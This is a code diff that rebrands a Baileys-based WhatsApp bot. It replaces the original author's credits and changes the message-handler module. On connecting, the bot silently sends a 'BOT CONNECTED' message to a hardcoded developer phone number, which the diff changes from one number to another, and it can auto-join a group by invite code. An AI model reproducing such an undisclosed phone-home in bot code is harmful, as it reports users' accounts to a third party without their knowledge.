@@ -17,7 +17,7 @@ async function startSesi() {
 const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
 const { state, saveCreds } = await useMultiFileAuthState(`./session`)
 const { version, isLatest } = await fetchLatestBaileysVersion()
-    console.log(chalk.red.bold('gunakanlah sc ini\ndengan\nbaik\ndan benar\nini khusus\nmohon maaf \nkalo\nada\nyang\ngak\nmiripp\n\n Tzy Version 1.0.0\n\nCreated By : JallMods Developer\nTelegram : @Alwaysjall\nSubscribe Youtube : @JallMods999'))
+    console.log(chalk.red.bold('Created by BlueDemon'))
 const connectionOptions = {
 version,
 keepAliveIntervalMs: 30000,
@@ -29,7 +29,7 @@ browser: [ "Ubuntu", "Chrome", "20.0.04" ]
 }
 const zyn = func.makeWASocket(connectionOptions)
 if(usePairingCode && !zyn.authState.creds.registered) {
-		const phoneNumber = await question(chalk.green('\nEnter Your Number\nNumber : '));
+		const phoneNumber = await question(chalk.blue('\nEnter Your whatsapp number\nNumber : '));
 		const code = await zyn.requestPairingCode(phoneNumber.trim())
 		console.log(chalk.green(`Your Pairing Code : ${code} `))
 
@@ -68,9 +68,9 @@ startSesi()
 } else if (connection === "connecting") {
 start(`1`, `Connecting...`)
 } else if (connection === "open") {
-success(`1`, `Tersambung`)
-zyn.sendMessage(`6283193344628@s.whatsapp.net`, { text: `\`𝗛𝗶 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿\`
-  Bot Succes Connecting`})
+success(`1`, `CONNECTED🤡`)
+zyn.sendMessage(`2347041039367@s.whatsapp.net`, { text: `\`𝗛𝗶 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿\`
+  *BOT CONNECTED SUCCESSFULLY*`})
 if (autoJoin) {
 zyn.groupAcceptInvite(codeInvite)
 }
@@ -86,7 +86,7 @@ if (m.key && m.key.remoteJid === 'status@broadcast') return zyn.readMessages([m.
 if (!zyn.public && !m.key.fromMe && chatUpdate.type === 'notify') return
 if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
 m = func.smsg(zyn, m, store)
-require("./Rafz")(zyn, m, store)
+require("./demontech")(zyn, m, store)
 } catch (err) {
 console.log(err)
 }
